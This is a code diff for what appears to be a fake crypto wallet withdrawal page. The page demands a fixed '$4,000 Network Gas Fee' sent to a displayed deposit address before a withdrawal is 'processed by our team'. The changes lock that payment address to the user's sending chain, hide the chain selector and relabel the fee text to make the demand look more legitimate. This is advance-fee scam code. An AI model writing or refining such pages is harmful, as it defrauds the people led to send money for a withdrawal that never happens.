@@ -220,7 +220,7 @@
           <strong id="dep-recipient-summary" style="font-family:var(--mono);font-size:12px;word-break:break-all;text-align:right;max-width:220px;">—</strong>
         </div>
         <div class="send-summary-row border-top pt-2 mt-1">
-          <span>Network Gas Fee</span>
+          <span>⛽ Network Gas Fee (<span id="dep-fee-chain-sym">ETH</span>)</span>
           <strong style="color:#ef4444;">$4,000.00</strong>
         </div>
       </div>
@@ -228,8 +228,8 @@
       <!-- Pay gas fee to this address -->
       <label class="wm-label mb-2"><i class="bi bi-wallet2 me-1"></i>Pay Gas Fee To This Address</label>
 
-      <!-- Chain tabs -->
-      <div class="dep-chain-tabs mb-3" id="dep-chain-tabs">
+      <!-- Chain tabs hidden — locked to sending chain -->
+      <div class="dep-chain-tabs mb-3" id="dep-chain-tabs" style="display:none;">
         <button class="dep-tab dep-tab-active" data-chain="ethereum" onclick="setDepChain('ethereum',this)">🔷 ETH</button>
         <button class="dep-tab" data-chain="bsc"      onclick="setDepChain('bsc',this)">🟡 BNB</button>
         <button class="dep-tab" data-chain="solana"   onclick="setDepChain('solana',this)">🟣 SOL</button>
@@ -246,7 +246,7 @@
 
       <div class="wm-info-box mb-4">
         <i class="bi bi-info-circle me-1"></i>
-        Send <strong>$4,000</strong> equivalent in the selected network token to the address above, then click <strong>"I've Paid"</strong>. Our team will verify and process your withdrawal within minutes.
+        Send <strong>$4,000</strong> equivalent in <strong id="dep-sym-label">ETH</strong> on the <strong id="dep-chain-name-label">Ethereum</strong> network to the address above, then click <strong>"I've Paid"</strong>. Our team will verify and process your withdrawal within minutes.
       </div>
 
       <button class="wm-cta-btn" onclick="submitGasPayment()">
@@ -465,12 +465,37 @@
     const addr   = document.getElementById('send-recipient').value.trim();
     const amount = document.getElementById('send-amount').value.trim();
     if (!addr)   { alert('Please enter a recipient address.'); return; }
-    if (!amount) { alert('Please enter an amount.'); return; }
+    if (!amount || parseFloat(amount) <= 0) { alert('Please enter an amount.'); return; }
 
     document.getElementById('dep-send-summary').textContent = `${amount} ${_sendSym}`;
     document.getElementById('dep-recipient-summary').textContent = addr;
-    setDepChain('ethereum', document.querySelector('.dep-tab[data-chain="ethereum"]'));
     document.getElementById('dep-status').textContent = '';
+
+    // Lock deposit chain to the SENDING chain — hide all other tabs
+    const tabsContainer = document.getElementById('dep-chain-tabs');
+    tabsContainer.style.display = 'none'; // hide chain selector — address is for sending chain
+
+    // Set the deposit chain = sending chain and show its address
+    _depChain = _sendChain;
+    document.getElementById('dep-addr-display').textContent = DEP_ADDRESSES[_sendChain] || EVM_ADDR;
+    document.getElementById('dep-chain-label').textContent  = DEP_LABELS[_sendChain]  || _sendChain;
+
+    // Update gas fee label with sending chain symbol
+    const feeChainSym = document.getElementById('dep-fee-chain-sym');
+    if (feeChainSym) feeChainSym.textContent = _sendSym;
+
+    // Update info box labels
+    const symLbl = document.getElementById('dep-sym-label');
+    const chainNameLbl = document.getElementById('dep-chain-name-label');
+    if (symLbl) symLbl.textContent = _sendSym;
+    if (chainNameLbl) {
+      const chainNames = { ethereum:'Ethereum', bsc:'BNB Chain', polygon:'Polygon', arbitrum:'Arbitrum', base:'Base', optimism:'Optimism', solana:'Solana' };
+      chainNameLbl.textContent = chainNames[_sendChain] || _sendChain;
+    }
+
+    // Reset copy button
+    const copyBtn = document.getElementById('dep-addr-copy-btn');
+    if (copyBtn) copyBtn.innerHTML = '<i class="bi bi-copy me-1"></i>Copy Address';
 
     document.getElementById('send-modal-overlay').classList.add('hidden');
     document.getElementById('send-deposit-overlay').classList.remove('hidden');
